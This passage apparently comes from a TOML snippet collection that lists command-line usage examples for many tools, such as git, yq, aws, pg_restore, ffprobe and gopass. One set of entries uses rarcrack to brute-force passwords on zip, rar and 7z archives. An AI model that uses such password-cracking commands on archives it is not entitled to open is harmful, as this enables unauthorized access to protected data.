  description = "Get a report for a directory excluding `.min.js` files"
  command = "tokei <path/to/directory> -e <*.min.js>"
  output = ""

[[snippets]]
  description = "Print out statistics for individual files in a directory"
  command = "tokei <path/to/directory> --files"
  output = ""

[[snippets]]
  description = "Get a report for all files of type Rust and Markdown"
  command = "tokei <path/to/directory> -t=<Rust>,<Markdown>"
  output = ""

[[snippets]]
  description = "Share result of command"
  command = "gotty <command>"
  output = ""

[[snippets]]
  description = "Share with write permission"
  command = "gotty -w <shell>"
  output = ""

[[snippets]]
  description = "Share with credential (Basic Auth)"
  command = "gotty -w -c <username>:<password> <shell>"
  output = ""

[[snippets]]
  description = "Enable one or more modules"
  command = "magento module:enable <module1 module2 ...>"
  output = ""

[[snippets]]
  description = "Disable one or more modules"
  command = "magento module:disable <module1 module2 ...>"
  output = ""

[[snippets]]
  description = "Update the database after enabling modules"
  command = "magento setup:upgrade"
  output = ""

[[snippets]]
  description = "Update code and dependency injection configuration"
  command = "magento setup:di:compile"
  output = ""

[[snippets]]
  description = "Deploy static assets"
  command = "magento setup:static-content:deploy"
  output = ""

[[snippets]]
  description = "Enable maintenance mode"
  command = "magento maintenance:enable"
  output = ""

[[snippets]]
  description = "Disable maintenance mode"
  command = "magento maintenance:disable"
  output = ""

[[snippets]]
  description = "List all available commands"
  command = "magento list"
  output = ""

[[snippets]]
  description = "View a running pipeline on the current branch"
  command = "glab pipeline status"
  output = ""

[[snippets]]
  description = "View a running pipeline on a specific branch"
  command = "glab pipeline status --branch <branch_name>"
  output = ""

[[snippets]]
  description = "Get the list of pipelines"
  command = "glab pipeline list"
  output = ""

[[snippets]]
  description = "Run a manual pipeline on the current branch"
  command = "glab pipeline run"
  output = ""

[[snippets]]
  description = "Run a manual pipeline on a specific branch"
  command = "glab pipeline run --branch <branch_name>"
  output = ""

[[snippets]]
  description = "Show information about the latest commit (hash, message, changes, and other metadata)"
  command = "git show"
  output = ""

[[snippets]]
  description = "Show information about a given commit"
  command = "git show <commit>"
  output = ""

[[snippets]]
  description = "Show information about the commit associated with a given tag"
  command = "git show <tag>"
  output = ""

[[snippets]]
  description = "Show information about the 3rd commit from the HEAD of a branch"
  command = "git show <branch>~<3>"
  output = ""

[[snippets]]
  description = "Show a commit's message in a single line, suppressing the diff output"
  command = "git show --oneline -s <commit>"
  output = ""

[[snippets]]
  description = "Show only statistics (added/removed characters) about the changed files"
  command = "git show --stat <commit>"
  output = ""

[[snippets]]
  description = "Show only the list of added, renamed or deleted files"
  command = "git show --summary <commit>"
  output = ""

[[snippets]]
  description = "Show the contents of a file as it was at a given revision (e.g. branch, tag or commit)"
  command = "git show <revision>:<path/to/file>"
  output = ""

[[snippets]]
  description = "Return a sorted list of best matching fonts"
  command = "fc-match -s '<DejaVu Serif>'"
  output = ""

[[snippets]]
  description = "Run a process that can live beyond the terminal"
  command = "nohup <command> <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Launch `nohup` in background mode"
  command = "nohup <command> <argument1 argument2 ...> &"
  output = ""

[[snippets]]
  description = "Run a shell script that can live beyond the terminal"
  command = "nohup <path/to/script.sh> &"
  output = ""

[[snippets]]
  description = "Run a process and write the output to a specific file"
  command = "nohup <command> <argument1 argument2 ...> > <path/to/output_file> &"
  output = ""

[[snippets]]
  description = "Perform a full update of all packages, development platforms and global libraries"
  command = "pio update"
  output = ""

[[snippets]]
  description = "Update core packages only (skips platforms and libraries)"
  command = "pio update --core-packages"
  output = ""

[[snippets]]
  description = "Check for new versions of packages, platforms and libraries but do not actually update them"
  command = "pio update --dry-run"
  output = ""

[[snippets]]
  description = "Output a YAML file, in pretty-print format (v4+)"
  command = "yq eval <path/to/file.yaml>"
  output = ""

[[snippets]]
  description = "Output a YAML file, in pretty-print format (v3)"
  command = "yq read <path/to/file.yaml> --colors"
  output = ""

[[snippets]]
  description = "Output the first element in a YAML file that contains only an array (v4+)"
  command = "yq eval '.[0]' <path/to/file.yaml>"
  output = ""

[[snippets]]
  description = "Output the first element in a YAML file that contains only an array (v3)"
  command = "yq read <path/to/file.yaml> '[0]'"
  output = ""

[[snippets]]
  description = "Set (or overwrite) a key to a value in a file (v4+)"
  command = "yq eval '.<key> = ""<value>""' --inplace <path/to/file.yaml>"
  output = ""

[[snippets]]
  description = "Set (or overwrite) a key to a value in a file (v3)"
  command = "yq write --inplace <path/to/file.yaml> '<key>' '<value>'"
  output = ""

[[snippets]]
  description = "Merge two files and print to `stdout` (v4+)"
  command = "yq eval-all 'select(filename == ""<path/to/file1.yaml>"") * select(filename == ""<path/to/file2.yaml>"")' <path/to/file1.yaml> <path/to/file2.yaml>"
  output = ""

[[snippets]]
  description = "Merge two files and print to `stdout` (v3)"
  command = "yq merge <path/to/file1.yaml> <path/to/file2.yaml> --colors"
  output = ""

[[snippets]]
  description = "Create a new p5 collection"
  command = "p5 new <collection_name>"
  output = ""

[[snippets]]
  description = "Generate a new p5 project (should be run from collection directory)"
  command = "p5 generate <project_name>"
  output = ""

[[snippets]]
  description = "Run the p5 manager server"
  command = "p5 server"
  output = ""

[[snippets]]
  description = "Update libraries to their latest versions"
  command = "p5 update"
  output = ""

[[snippets]]
  description = "Display a list of installed versions"
  command = "exenv versions"
  output = ""

[[snippets]]
  description = "Use a specific version of Elixir across the whole system"
  command = "exenv global <version>"
  output = ""

[[snippets]]
  description = "Use a specific version of Elixir for the current application/project directory"
  command = "exenv local <version>"
  output = ""

[[snippets]]
  description = "Show the currently selected Elixir version"
  command = "exenv <version>"
  output = ""

[[snippets]]
  description = "Install a version of Elixir (requires `elixir-build` plugin <https://github.com/mururu/elixir-build>)"
  command = "exenv install <version>"
  output = ""

[[snippets]]
  description = "Initialize a database with a scale factor of 50 times the default size"
  command = "pgbench --initialize --scale=<50> <database_name>"
  output = ""

[[snippets]]
  description = "Benchmark a database with 10 clients, 2 worker threads, and 10,000 transactions per client"
  command = "pgbench --client=<10> --jobs=<2> --transactions=<10000> <database_name>"
  output = ""

[[snippets]]
  description = "Configure the application token and the preferred workspace for Exercism"
  command = "exercism configure --token=<your-application-token> --workspace=</path/to/preferred/workspace>"
  output = ""

[[snippets]]
  description = "Download a specific exercise"
  command = "exercism download --exercise=<exercise_slug> --track=<track_slug>"
  output = ""

[[snippets]]
  description = "Submit an exercise"
  command = "exercism submit <path/to/file>"
  output = ""

[[snippets]]
  description = "Print the path to the solution workspace"
  command = "exercism workspace"
  output = ""

[[snippets]]
  description = "Initialize or mount an encrypted filesystem"
  command = "encfs </path/to/cipher_dir> </path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Initialize an encrypted filesystem with standard settings"
  command = "encfs --standard </path/to/cipher_dir> </path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Run encfs in the foreground instead of spawning a daemon"
  command = "encfs -f </path/to/cipher_dir> </path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Mount an encrypted snapshot of a plain directory"
  command = "encfs --reverse <path/to/plain_dir> <path/to/cipher_dir>"
  output = ""

[[snippets]]
  description = "List all objects of a specific type"
  command = "aws sns list-<origination-numbers|phone-numbers-opted-out|platform-applications|sms-sandbox-phone-numbers|subscriptions|topics>"
  output = ""

[[snippets]]
  description = "Create a topic with a specific name and show its Amazon Resource Name (ARN)"
  command = "aws sns create-topic --name <name>"
  output = ""

[[snippets]]
  description = "Subscribe an email address to the topic with a specific ARN and show the subscription ARN"
  command = "aws sns subscribe --topic-arn <topic_ARN> --protocol email --notification-endpoint <email>"
  output = ""

[[snippets]]
  description = "Publish a message to a specific topic or phone number and show the message ID"
  command = "aws sns publish <--topic-arn ""arn:aws:sns:us-west-2:123456789012:topic-name""||--phone-number +1-555-555-0100> --message file://<path/to/file>"
  output = ""

[[snippets]]
  description = "Delete the subscription with a specific ARN from its topic"
  command = "aws sns unsubscribe --subscription-arn <subscription_ARN>"
  output = ""

[[snippets]]
  description = "Create a platform endpoint"
  command = "aws sns create-platform-endpoint --platform-application-arn <platform_application_ARN> --token <token>"
  output = ""

[[snippets]]
  description = "Add a statement to a topic's access control policy"
  command = "aws sns add-permission --topic-arn <topic_ARN> --label <topic_label> --aws-account-id <account_id> --action-name <AddPermission|CreatePlatformApplication|DeleteEndpoint|GetDataProtectionPolicy|GetEndpointAttributes|Subscribe|...>"
  output = ""

[[snippets]]
  description = "Add a tag to the topic with a specific ARN"
  command = "aws sns tag-resource --resource-arn <topic_ARN> --tags <Key=tag1_key Key=tag2_key,Value=tag2_value ...>"
  output = ""

[[snippets]]
  description = "Run command as new root directory"
  command = "chroot <path/to/new/root> <command>"
  output = ""

[[snippets]]
  description = "Use a specific user and group"
  command = "chroot --userspec=<username_or_id:group_name_or_id>"
  output = ""

[[snippets]]
  description = "View documentation for the command available in macOS"
  command = "tldr open -p osx"
  output = ""

[[snippets]]
  description = "View documentation for the command available through `fish`"
  command = "tldr open.fish"
  output = ""

[[snippets]]
  description = "Generate a pre-signed URL for a specific S3 object that is valid for one hour"
  command = "aws s3 presign s3://<bucket_name>/<path/to/file>"
  output = ""

[[snippets]]
  description = "Generate a pre-signed URL valid for a specific lifetime"
  command = "aws s3 presign s3://<bucket_name>/<path/to/file> --expires-in <duration_in_seconds>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws s3 presign help"
  output = ""

[[snippets]]
  description = "Extract textural features from a PGM image"
  command = "pgmtexture <path/to/image.pgm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Specify the distance parameter for the feature extraction algorithm"
  command = "pgmtexture -d <distance> <path/to/image.pgm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Check out a working copy from a repository"
  command = "svn co <url/to/repository>"
  output = ""

[[snippets]]
  description = "Bring changes from the repository into the working copy"
  command = "svn up"
  output = ""

[[snippets]]
  description = "Put files and directories under version control, scheduling them for addition to repository. They will be added in next commit"
  command = "svn add <PATH>"
  output = ""

[[snippets]]
  description = "Send changes from your working copy to the repository"
  command = "svn ci -m <commit_log_message> [<PATH>]"
  output = ""

[[snippets]]
  description = "Display changes from the last 10 revisions, showing modified files for each revision"
  command = "svn log -vl <10>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "svn help"
  output = ""

[[snippets]]
  description = "Convert WAV to Opus using default options"
  command = "opusenc <path/to/input.wav> <path/to/output.opus>"
  output = ""

[[snippets]]
  description = "Convert stereo audio at the highest quality level"
  command = "opusenc --bitrate <512> <path/to/input.wav> <path/to/output.opus>"
  output = ""

[[snippets]]
  description = "Convert 5.1 surround sound audio at the highest quality level"
  command = "opusenc --bitrate <1536> <path/to/input.flac> <path/to/output.opus>"
  output = ""

[[snippets]]
  description = "Convert speech audio at the lowest quality level"
  command = "opusenc <path/to/input.wav> --downmix-mono --bitrate <6> <path/to/out.opus>"
  output = ""

[[snippets]]
  description = "Load a CSV file into a `CSVKitReader` object"
  command = "csvpy <data.csv>"
  output = ""

[[snippets]]
  description = "Load a CSV file into a `CSVKitDictReader` object"
  command = "csvpy --dict <data.csv>"
  output = ""

[[snippets]]
  description = "Generate a new StrongNaming key"
  command = "sn -k <path/to/key.snk>"
  output = ""

[[snippets]]
  description = "Re-sign an assembly with the specified private key"
  command = "sn -R <path/to/assembly.dll> <path/to/key_pair.snk>"
  output = ""

[[snippets]]
  description = "Show the public key of the private key that was used to sign an assembly"
  command = "sn -T <path/to/assembly.exe>"
  output = ""

[[snippets]]
  description = "Extract the public key to a file"
  command = "sn -e <path/to/assembly.dll> <path/to/output.pub>"
  output = ""

[[snippets]]
  description = "Edge-enhance a PGM image"
  command = "pgmenhance <path/to/image.pgm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Specify the level of enhancement"
  command = "pgmenhance -<1..9> <path/to/image.pgm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Check all files in the current directory (including subdirectories)"
  command = "rubocop"
  output = ""

[[snippets]]
  description = "Check one or more specific files or directories"
  command = "rubocop <path/to/file> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Write output to file"
  command = "rubocop --out <path/to/file>"
  output = ""

[[snippets]]
  description = "View list of cops (linter rules)"
  command = "rubocop --show-cops"
  output = ""

[[snippets]]
  description = "Exclude a cop"
  command = "rubocop --except <cop_1> <cop_2>"
  output = ""

[[snippets]]
  description = "Run only specified cops"
  command = "rubocop --only <cop_1> <cop_2>"
  output = ""

[[snippets]]
  description = "Auto-correct files (experimental)"
  command = "rubocop --auto-correct"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzgrep"
  output = ""

[[snippets]]
  description = "Copy an existing file in a Git repo, staying in the same directory"
  command = "git cp <file> <new_file>"
  output = ""

[[snippets]]
  description = "Copy an existing file in a Git repo and place it elsewhere"
  command = "git cp <path/to/file> <path/to/new_file>"
  output = ""

[[snippets]]
  description = "Brute force the password for an archive (tries to guess the archive type)"
  command = "rarcrack <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Specify the archive type"
  command = "rarcrack --type <rar|zip|7z> <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Use multiple threads"
  command = "rarcrack --threads <6> <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "View documentation for the current command"
  command = "tldr pbmtoxbm"
  output = ""

[[snippets]]
  description = "Download/Update all packages specified in `pubspec.yaml`"
  command = "flutter pub get"
  output = ""

[[snippets]]
  description = "Add a package dependency to an app"
  command = "flutter pub add <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Remove a package dependency from an app"
  command = "flutter pub remove <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Upgrade to the highest version of a package that is allowed by `pubspec.yaml`"
  command = "flutter pub upgrade <package>"
  output = ""

[[snippets]]
  description = "Save RAW data from a frequency (specified in Hz) to a file"
  command = "rtl_sdr -f <100000000> <path/to/file>"
  output = ""

[[snippets]]
  description = "Pipe data to another program"
  command = "rtl_sdr -f <100000000> - | <aplay>"
  output = ""

[[snippets]]
  description = "Read a specified number of samples"
  command = "rtl_sdr -f <100000000> -n <20> -"
  output = ""

[[snippets]]
  description = "Specify the sample rate in Hz (ranges 225001-300000 and 900001-3200000)"
  command = "rtl_sdr -f <100000000> -s <2400000> -"
  output = ""

[[snippets]]
  description = "Specify the device by its index"
  command = "rtl_sdr -f <100000000> -d <0> -"
  output = ""

[[snippets]]
  description = "Specify the gain"
  command = "rtl_sdr -f <100000000> -g <20> -"
  output = ""

[[snippets]]
  description = "Specify the output block size"
  command = "rtl_sdr -f <100000000> -b <9999999> -"
  output = ""

[[snippets]]
  description = "Use synchronous output"
  command = "rtl_sdr -f <100000000> -S -"
  output = ""

[[snippets]]
  description = "Restore an archive into an existing database"
  command = "pg_restore -d <db_name> <archive_file.dump>"
  output = ""

[[snippets]]
  description = "Same as above, customize username"
  command = "pg_restore -U <username> -d <db_name> <archive_file.dump>"
  output = ""

[[snippets]]
  description = "Same as above, customize host and port"
  command = "pg_restore -h <host> -p <port> -d <db_name> <archive_file.dump>"
  output = ""

[[snippets]]
  description = "List database objects included in the archive"
  command = "pg_restore --list <archive_file.dump>"
  output = ""

[[snippets]]
  description = "Clean database objects before creating them"
  command = "pg_restore --clean -d <db_name> <archive_file.dump>"
  output = ""

[[snippets]]
  description = "Use multiple jobs to do the restoring"
  command = "pg_restore -j <2> -d <db_name> <archive_file.dump>"
  output = ""

[[snippets]]
  description = "Display all available stream info for a media file"
  command = "ffprobe -v error -show_streams <input.mp4>"
  output = ""

[[snippets]]
  description = "Display media duration"
  command = "ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 <input.mp4>"
  output = ""

[[snippets]]
  description = "Display the frame rate of a video"
  command = "ffprobe -v error -select_streams v:0 -show_entries stream=avg_frame_rate -of default=noprint_wrappers=1:nokey=1 <input.mp4>"
  output = ""

[[snippets]]
  description = "Display the width or height of a video"
  command = "ffprobe -v error -select_streams v:0 -show_entries stream=<width|height> -of default=noprint_wrappers=1:nokey=1 <input.mp4>"
  output = ""

[[snippets]]
  description = "Display the average bit rate of a video"
  command = "ffprobe -v error -select_streams v:0 -show_entries stream=bit_rate -of default=noprint_wrappers=1:nokey=1 <input.mp4>"
  output = ""

[[snippets]]
  description = "Specify the color theme (defaults to `theme.ron`)"
  command = "gitui --theme <theme>"
  output = ""

[[snippets]]
  description = "Store logging output into a cache directory"
  command = "gitui --logging"
  output = ""

[[snippets]]
  description = "Use notify-based file system watcher instead of tick-based update"
  command = "gitui --watcher"
  output = ""

[[snippets]]
  description = "Generate a bug report"
  command = "gitui --bugreport"
  output = ""

[[snippets]]
  description = "Use a specific Git directory"
  command = "gitui --directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "Use a specific working directory"
  command = "gitui --workdir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gitui --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "gitui --version"
  output = ""

[[snippets]]
  description = "Display default information about a font"
  command = "fc-pattern --default '<DejaVu Serif>'"
  output = ""

[[snippets]]
  description = "Display configuration information about a font"
  command = "fc-pattern --config '<DejaVu Serif>'"
  output = ""

[[snippets]]
  description = "Initialize the configuration settings"
  command = "gopass init"
  output = ""

[[snippets]]
  description = "Create a new entry"
  command = "gopass new"
  output = ""

[[snippets]]
  description = "Show all stores"
  command = "gopass mounts"
  output = ""

[[snippets]]
  description = "Mount a shared Git store"
  command = "gopass mounts add <store_name> <git_repo_url>"
  output = ""

[[snippets]]
  description = "Search interactively using a keyword"
  command = "gopass show <keyword>"
  output = ""

[[snippets]]
  description = "Search using a keyword"
  command = "gopass find <keyword>"
  output = ""

[[snippets]]
  description = "Sync all mounted stores"
  command = "gopass sync"
  output = ""

[[snippets]]
  description = "Show a particular password entry"
  command = "gopass <store_name|path/to/directory|email@email.com>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "most <path/to/file>"
  output = ""

[[snippets]]
  description = "Open several files"
  command = "most <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Open a file at the first occurrence of "string""
  command = "most <path/to/file> +/<string>"
  output = ""

[[snippets]]
  description = "Move through opened files"
  command = ":O n"
  output = ""

[[snippets]]
  description = "Jump to the 100th line"
  command = "<100>j"
  output = ""

[[snippets]]
  description = "Edit current file"
  command = "e"
  output = ""

[[snippets]]
  description = "Split the current window in half"
  command = "<CTRL-x> o"
  output = ""

[[snippets]]
  description = "Exit"
  command = "Q"
  output = ""

[[snippets]]
  description = "List all configured repositories and their tags (if set)"
  command = "tlmgr repository list"
  output = ""

[[snippets]]
  description = "List all packages available in a specific repository"
  command = "tlmgr repository list <path|url|tag>"
  output = ""

[[snippets]]
  description = "Add a new repository with a specific tag (the tag is not required)"
  command = "sudo tlmgr repository add <path|url> <tag>"
  output = ""

[[snippets]]
  description = "Remove a specific repository"
  command = "sudo tlmgr repository remove <path|url|tag>"
  output = ""

[[snippets]]
  description = "Set a new list of repositories, overwriting the previous list"
  command = "sudo tlmgr repository set <path|url|tag>#<tag> <path|url|tag>#<tag> <...>"
  output = ""

[[snippets]]
  description = "Show the verification status of all configured repositories"
  command = "tlmgr repository status"
  output = ""

[[snippets]]
  description = "Compress a specific PNG as much as possible and write result to a new file"
  command = "pngquant <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a specific PNG and override original"
  command = "pngquant --ext .png --force <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Try to compress a specific PNG with custom quality (skip if below the min value)"
  command = "pngquant --quality <0-100> <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a specific PNG with the number of colors reduced to 64"
  command = "pngquant <64> <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a specific PNG and skip if the file is larger than the original"
  command = "pngquant --skip-if-larger <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a specific PNG and remove metadata"
  command = "pngquant --strip <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a specific PNG and save it to the given path"
  command = "pngquant <path/to/file.png> --output <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a specific PNG and show progress"
  command = "pngquant --verbose <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Recursively search the current directory for a pattern and cache it"
  command = "vgrep <search_pattern>"
  output = ""

[[snippets]]
  description = "Display the contents of the cache"
  command = "vgrep"
  output = ""

[[snippets]]
  description = "Open the "4th" match from the cache in the default editor"
  command = "vgrep --show <4>"
  output = ""

[[snippets]]
  description = "Display a context of "3" lines for each match in the cache"
  command = "vgrep --show=context<3>"
  output = ""

[[snippets]]
  description = "Display the number of matches for each directory in the tree"
  command = "vgrep --show=tree"
  output = ""

[[snippets]]
  description = "Display the number of matches for each file in the tree"
  command = "vgrep --show=files"
  output = ""

[[snippets]]
  description = "Start an interactive shell with cached matches"
  command = "vgrep --interactive"
  output = ""

[[snippets]]
  description = "Display the numeric identifier for the current host in hexadecimal"
  command = "hostid"
  output = ""

[[snippets]]
  description = "Trigger a pipeline to run from a Git branch, commit or tag"
  command = "vela add deployment --org <organization> --repo <repository_name> --target <environment> --ref <branch|commit|refs/tags/git_tag> --description ""<deploy_description>"""
  output = ""

[[snippets]]
  description = "List deployments for a repository"
  command = "vela get deployment --org <organization> --repo <repository_name>"
  output = ""

[[snippets]]
  description = "Inspect a specific deployment"
  command = "vela view deployment --org <organization> --repo <repository_name> --deployment <deployment_number>"
  output = ""

[[snippets]]
  description = "Authorize `twurl` to access a Twitter account"
  command = "twurl authorize --consumer-key <twitter_api_key> --consumer-secret <twitter_api_secret>"
  output = ""

[[snippets]]
  description = "Make a GET request to an API endpoint"
  command = "twurl -X GET <twitter_api_endpoint>"
  output = ""

[[snippets]]
  description = "Make a POST request to an API endpoint"
  command = "twurl -X POST -d '<endpoint_params>' <twitter_api_endpoint>"
  output = ""

[[snippets]]
  description = "Upload media to Twitter"
  command = "twurl -H ""<twitter_upload_url>"" -X POST ""<twitter_upload_endpoint>"" --file ""<path/to/media.jpg>"" --file-field ""media"""
  output = ""

[[snippets]]
  description = "Access a different Twitter API host"
  command = "twurl -H <twitter_api_url> -X GET <twitter_api_endpoint>"
  output = ""

[[snippets]]
  description = "Create an alias for a requested resource"
  command = "twurl alias <alias_name> <resource>"
  output = ""

[[snippets]]
  description = "Report what would be removed by Git prune without removing it"
  command = "git prune --dry-run"
  output = ""

[[snippets]]
  description = "Prune unreachable objects and display what has been pruned to `stdout`"
  command = "git prune --verbose"
  output = ""

[[snippets]]
  description = "Prune unreachable objects while showing progress"
  command = "git prune --progress"
  output = ""

[[snippets]]
  description = "Generate a Go struct from a given XML from `stdin` and display output on `stdout`"
  command = "cat <path/to/input.xml> | zek"
  output = ""

[[snippets]]
  description = "Generate a Go struct from a given XML from `stdin` and send output to a file"
  command = "curl -s <https://url/to/xml> | zek -o <path/to/output.go>"
  output = ""

[[snippets]]
  description = "Generate an example Go program from a given XML from `stdin` and send output to a file"
  command = "cat <path/to/input.xml> | zek -p -o <path/to/output.go>"
  output = ""

[[snippets]]
  description = "Display information about a specific instance"
  command = "aws ec2 describe-instances --instance-ids <instance_id>"
  output = ""

[[snippets]]
  description = "Display information about all instances"
  command = "aws ec2 describe-instances"
  output = ""

[[snippets]]
  description = "Display information about all EC2 volumes"
  command = "aws ec2 describe-volumes"
  output = ""

[[snippets]]
  description = "Delete an EC2 volume"
  command = "aws ec2 delete-volume --volume-id <volume_id>"
  output = ""

[[snippets]]
  description = "Create a snapshot from an EC2 volume"
  command = "aws ec2 create-snapshot --volume-id <volume_id>"
  output = ""

[[snippets]]
  description = "List available AMIs (Amazon Machine Images)"
  command = "aws ec2 describe-images"
  output = ""

[[snippets]]
  description = "Show list of all available EC2 commands"
  command = "aws ec2 help"
  output = ""

[[snippets]]
  description = "Display help for specific EC2 subcommand"
  command = "aws ec2 <subcommand> help"
  output = ""

[[snippets]]
  description = "Show a given author's commits from the last 10 days"
  command = "git standup -a <name|email> -d <10>"
  output = ""

[[snippets]]
  description = "Show a given author's commits from the last 10 days and whether they are GPG signed"
  command = "git standup -a {[name|email> -d <10> -g"
  output = ""

[[snippets]]
  description = "Show all the commits from all contributors for the last 10 days"
  command = "git standup -a all -d <10>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "git standup -h"
  output = ""

[[snippets]]
  description = "Roll 3 6-sided dice and sums the results"
  command = "roll <3d>"
  output = ""

[[snippets]]
  description = "Roll 1 8-sided die, add 3 and sum the results"
  command = "roll <d8 + 3>"
  output = ""

[[snippets]]
  description = "Roll 4 6-sided dice, keep the 3 highest results and sum the results"
  command = "roll <4d6h3>"
  output = ""

[[snippets]]
  description = "Roll 2 12-sided dice 2 times and show every roll"
  command = "roll --verbose <2{2d12>}"
  output = ""

[[snippets]]
  description = "Roll 2 20-sided dice until the result is bigger than 10"
  command = "roll ""<2d20>10>"""
  output = ""

[[snippets]]
  description = "Roll 2 5-sided dice 3 times and show the total sum"
  command = "roll --sum-series <3{2d5>}"
  output = ""

[[snippets]]
  description = "Show lint errors in a file"
  command = "pylint <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Lint a file and use a configuration file (usually named `pylintrc`)"
  command = "pylint --rcfile <path/to/pylintrc> <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Lint a file and disable a specific error code"
  command = "pylint --disable <C,W,no-error,design> <path/to/file>"
  output = ""

[[snippets]]
  description = "Generate a string of three random phrases containing an adjective, a past tense verb and a plural noun"
  command = "buzzphrase"
  output = ""

[[snippets]]
  description = "Print a phrase formatted as [i]mperative verb + past tense [v]erb + [a]djective + plural [N]oun"
  command = "buzzphrase <'{i} {v} {a} {N}'>"
  output = ""

[[snippets]]
  description = "Print `k` phrases formatted as present participle [V]erb + [a]djective + singular [n]oun + [f]inal"
  command = "buzzphrase <k> <'{V} {a} {n} {f}'>"
  output = ""

[[snippets]]
  description = "Produce a complete HTML document from a source code file"
  command = "highlight --out-format=<html> --style <theme_name> --syntax <language> <path/to/source_code>"
  output = ""

[[snippets]]
  description = "Produce an HTML fragment, suitable for inclusion in a larger document"
  command = "highlight --out-format=<html> --fragment --syntax <language> <source_file>"
  output = ""

[[snippets]]
  description = "Inline the CSS styling in every tag"
  command = "highlight --out-format=<html> --inline-css --syntax <language> <source_file>"
  output = ""

[[snippets]]
  description = "List all supported languages, themes, or plugins"
  command = "highlight --list-scripts <langs|themes|plugins>"
  output = ""

[[snippets]]
  description = "Print a CSS stylesheet for a theme"
  command = "highlight --out-format=<html> --print-style --style <theme_name> --syntax <language>] --stdout"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr pio debug"
  output = ""

[[snippets]]
  description = "Build the specified target in the workspace"
  command = "bazel build <target>"
  output = ""

[[snippets]]
  description = "Remove output files and stop the server if running"
  command = "bazel clean"
  output = ""

[[snippets]]
  description = "Stop the bazel server"
  command = "bazel shutdown"
  output = ""

[[snippets]]
  description = "Display runtime info about the bazel server"
  command = "bazel info"
  output = ""

[[snippets]]
  description = "Display help"
  command = "bazel help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "bazel version"
  output = ""

[[snippets]]
  description = "Build all targets"
  command = "dune build"
  output = ""

[[snippets]]
  description = "Clean up the workspace"
  command = "dune clean"
  output = ""

[[snippets]]
  description = "Run all tests"
  command = "dune runtest"
  output = ""

[[snippets]]
  description = "Start the utop REPL with compiled modules automatically loaded into it, to remove the need to load them by hand"
  command = "dune utop"
  output = ""

[[snippets]]
  description = "Render a CommonMark Markdown file to HTML"
  command = "cmark --to html <filename.md>"
  output = ""

[[snippets]]
  description = "Convert data from `stdin` to LaTeX"
  command = "cmark --to latex"
  output = ""

[[snippets]]
  description = "Convert straight quotes to smart quotes"
  command = "cmark --smart --to html <filename.md>"
  output = ""

[[snippets]]
  description = "Validate UTF-8 characters"
  command = "cmark --validate-utf8 <filename.md>"
  output = ""

[[snippets]]
  description = "List all NodeBalancers"
  command = "linode-cli nodebalancers list"
  output = ""

[[snippets]]
  description = "Create a new NodeBalancer"
  command = "linode-cli nodebalancers create --region <region>"
  output = ""

[[snippets]]
  description = "View details of a specific NodeBalancer"
  command = "linode-cli nodebalancers view <nodebalancer_id>"
  output = ""

[[snippets]]
  description = "Update an existing NodeBalancer"
  command = "linode-cli nodebalancers update <nodebalancer_id> --label <new_label>"
  output = ""

[[snippets]]
  description = "Delete a NodeBalancer"
  command = "linode-cli nodebalancers delete <nodebalancer_id>"
  output = ""

[[snippets]]
  description = "List configurations for a NodeBalancer"
  command = "linode-cli nodebalancers configs list <nodebalancer_id>"
  output = ""

[[snippets]]
  description = "Add a new configuration to a NodeBalancer"
  command = "linode-cli nodebalancers configs create <nodebalancer_id> --port <port> --protocol <protocol>"
  output = ""

[[snippets]]
  description = "Start an interactive environment for evaluating Nix expressions"
  command = "nix repl"
  output = ""

[[snippets]]
  description = "Load all packages from a flake (e.g. `nixpkgs`) into scope"
  command = ":lf <nixpkgs>"
  output = ""

[[snippets]]
  description = "Build a package from an expression"
  command = ":b <expression>"
  output = ""

[[snippets]]
  description = "Start a shell with package from the expression available"
  command = ":u <expression>"
  output = ""

[[snippets]]
  description = "Start a shell with dependencies of the package from the expression available"
  command = ":s <expression>"
  output = ""

[[snippets]]
  description = "Add or remove a URL from a torrent's announce list"
  command = "transmission-edit --<add|delete> <http://example.com> <path/to/file.torrent>"
  output = ""

[[snippets]]
  description = "Update a tracker's passcode in a torrent file"
  command = "transmission-edit --replace <old-passcode> <new-passcode> <path/to/file.torrent>"
  output = ""

[[snippets]]
  description = "Convert a HIPS file into a PGM image"
  command = "hipstopgm <path/to/file.hips>"
  output = ""

[[snippets]]
  description = "Suppress all informational messages"
  command = "hipstopgm -quiet"
  output = ""

[[snippets]]
  description = "Display version"
  command = "hipstopgm -version"
  output = ""

[[snippets]]
  description = "Show the queued jobs of the default destination"
  command = "lpq"
  output = ""

[[snippets]]
